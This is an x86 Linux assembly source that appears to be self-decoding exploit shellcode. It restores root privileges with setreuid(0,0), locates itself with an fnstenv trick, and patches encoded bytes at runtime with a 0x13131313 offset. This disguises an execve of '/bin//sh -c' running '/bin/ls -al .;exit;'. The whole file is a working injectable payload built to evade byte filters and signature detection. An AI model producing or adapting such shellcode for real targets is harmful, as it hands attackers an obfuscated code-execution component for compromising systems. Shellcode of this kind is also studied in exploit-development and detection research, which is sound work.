section .text
global _start
_start:

	fcmovbe st5			;2 bytes 	;DAD5
	fnstenv [esp-0xc]		;4 bytes 	;D97424F4
	pop edi				;1 byte  	;5F		;;;7 bytes
	push byte +0x46
	pop eax
	xor ebx,ebx
	xor ecx,ecx
	int 0x80
	mov ebx, 0x13131313		;5 bytes	;BB13131313	;;;12 bytes
	push ecx			;1 byte		;51
	sub word [edi+0x2c],bx		;4 bytes	;66295f??
	add word [edi+0x33],bx		;4 bytes	;66015f??
	sub dword [edi+0x39],ebx	;3 bytes	;295f??
	add dword [edi+0x3e],ebx	;3 bytes	;015f??
	sub dword [edi+0x48],ebx	;3 bytes	;295f??
	jmp short jmp_string
jmp_exec:
	pop edi
	; push byte +0xb
	push word 0x131e		;+1 byte
	pop eax
	cdq
	push edx
	; push word 0x632d		
	push word 0x501a		
	mov esi,esp
	push edx
	; push dword 0x68732f2f
	push dword 0x7b864242
	; push dword 0x6e69622f
	push dword 0x5b564f1c
	mov ebx,esp
	push edx
	push edi
	push esi
	push ebx
	; mov ecx,esp		;89e1
	; int 0x80		;cd80
	pushfd			;9c
	hlt			;f4
	db 0xe0			;e0
	db 0x93			;93
	; alternative to two bytes above is loopne 0xffffff95; broken bytes
jmp_string:
	call jmp_exec
	das
	bound ebp,[ecx+0x6e]
	das
	insb
	db 0x73
	db 0x20
	db 0x2d
	popad
	insb
	db 0x20
	db 0x2e
	cmp esp,[ebp+0x78]
	db 0x69
	db 0x74
	db 0x3b

